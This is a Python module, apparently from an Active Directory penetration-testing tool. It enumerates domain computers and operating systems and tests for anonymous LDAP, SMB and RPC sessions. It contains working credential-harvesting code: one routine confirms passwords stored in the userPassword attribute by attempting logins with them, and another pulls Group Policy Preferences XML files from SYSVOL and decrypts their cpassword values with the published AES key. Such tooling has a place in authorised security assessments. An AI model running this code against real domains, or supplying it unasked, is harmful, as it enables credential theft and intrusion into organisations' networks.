# -*- coding: utf-8 -*-

import json
import ldap3
import re
import base64
import os
from ldap3.core.exceptions import LDAPBindError
from impacket.dcerpc.v5 import epm
from impacket.smbconnection import SessionError
from impacket.nmb import NetBIOSError
from termcolor import colored
from Cryptodome.Cipher import AES

from . .connectors.connectors import Connectors

class ModEnumerator():

    def __init__(self):
        pass


    def enumerate_server_names(self, computerobjects: ldap3.Entry) -> dict:
        '''Return a dict of key(dNSHostName) and value(fingerprinted servertype)
        
        '''
        wordlist = {
            "mssql": ["mssql", "sqlserver"],
            "ftp": ["ftp"], 
            "smtp": ["exchange", "smtp"],
            "ad": ["dc", "domaincontroller", "msol", "domain controller"]
        }
        results = {}

        for key, value in wordlist.items():
            for fingerprint in value:
                for obj in computerobjects:
                    if fingerprint in str(obj["name"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["dNSHostName"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["distinguishedName"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["dNSHostName"]).lower():
                        results[str(obj["dNSHostName"])] = key

        return results

    def enumerate_os_version(self, computerobjects: ldap3.Entry) -> dict:
        '''Return a dict of key(os_version) and value(computers with said os)

        '''
        os_json = {
                # Should perhaps include older version
                "Windows XP": [],
                "Windows Server 2008": [],
                "Windows 7": [],
                "Windows Server 2012": [],
                "Windows 10": [],
                "Windows Server 2016": [],
                "Windows Server 2019": []
        }
        idx = 0
        for _ in computerobjects:
            computer = json.loads(computerobjects[idx].entry_to_json())
            idx += 1    

            for os_version in os_json.keys():
                try:
                    if os_version in computer['attributes'].get('operatingSystem')[0]:
                        if computer['attributes']['dNSHostName'][0] not in os_json[os_version]:
                            os_json[os_version].append(computer['attributes']['dNSHostName'][0])
                except TypeError:
                    # computer['attributes'].get('operatingSystem') is of NoneType, just continue
                    continue

        return os_json

    
    def enumerate_for_cleartext_passwords(self, peopleobjects: ldap3.Entry, server: str) -> dict:
        '''Return a dict of key(username) and value(password)

        '''
        passwords = {}

        idx = 0
        for _ in peopleobjects:
            user = json.loads(peopleobjects[idx].entry_to_json())
            idx += 1    
            if user['attributes'].get('userPassword') is not None:
                # Attempt login
                try:
                    # First we try encrypted
                    conn = Connectors().ldap_connector(server=server, ldaps=True, domuser=user['attributes']['name'][0], passwd=user['attributes'].get('userPassword'))
                except LDAPBindError:
                    # Then default to non-encrypted
                    try:
                        conn = Connectors().ldap_connector(server=server, ldaps=False, domuser=user['attributes']['name'][0], passwd=user['attributes'].get('userPassword'))
                    except LDAPBindError:
                        # No luck
                        continue
                finally:
                    if int(conn.result['result']) == 0:
                        # We had a valid login
                        passwords[user['attributes']['name'][0]] = user['attributes'].get('userPassword')

        return passwords


    def enumNULLSessions(self, server: str, connector: Connectors):
        # Test for anonymous binds to ldap
        try:
            ldap = connector.ldap_connector(server, False, '', '')
            print('[ ' + colored('WARN', 'yellow') +' ] Anonymous LDAP bind allowed')
        except LDAPBindError:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous LDAP bind not allowed')
        ldap.unbind()

        # Test for null-session/anonymous session on smb
        smb = connector.smb_connector(server, '', '')
        if smb:
            # It is not False and as such, we got a connection back
            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL SMB connection allowed got ServerOS: {smb.getServerOS()} and HostName: {str(smb.getServerName())}')
        else:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL SMB connection not allowed')
        smb.logoff()

        # Test for null-session/anonymous session on rpc
        rpc = connector.rpc_connector(server, '', '')
        resp = rpc.bind(epm.MSRPC_UUID_PORTMAP)
        # TODO: Validate by negative test
        if resp.getData():
            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL RPC connection allowed got following bytes: {resp.getData()} from the connection')
        else:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL RPC connection not allowed')


    def enumSYSVOL(self, server: str, connector: Connectors, domuser: str, passwd: str) -> dict:
        print('[ .. ] Searching SYSVOL for cpasswords\r')
        cpasswords = {}
        try:
            smbconn = connector.smb_connector(server, domuser, passwd)
            dirs = smbconn.listShares()
            for share in dirs:
                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
                    for dirname in paths:
                        try:
                            # Dont want . or ..
                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                            for sub in subPath:
                                if len(sub.get_shortname()) > 2:
                                    paths.append(dirname + '\\' + sub.get_shortname())
                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                            continue
                
                    # Compile regexes for username and passwords
                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')

                    # Prepare the ciphers based on MSDN article with key and IV
                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
                
                    # Since the first entry is the DC we dont want that
                    for item in paths[1:]:
                        if '.xml' in item.split('\\')[-1]:
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                                try:
                                    fileContent = f.read()
                                    passwdMatch = cpassRE.findall(str(fileContent))
                                    for passwd in passwdMatch:
                                        unameMatch = unameRE.findall(str(fileContent))
                                        for usr in unameMatch:
                                            padding = '=' * (4 - len(passwd) % 4) 
                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
                                except (UnicodeDecodeError, AttributeError) as e:
                                    # Remove the files we had to write during the search
                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
                                    continue

                            # Remove the files we had to write during the search
                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))

        except (SessionError, UnicodeEncodeError, NetBIOSError):
            print('[ ' + colored('ERROR', 'red') + ' ] Some error occoured while searching SYSVOL')
        else:
            smbconn.close()
            return cpasswords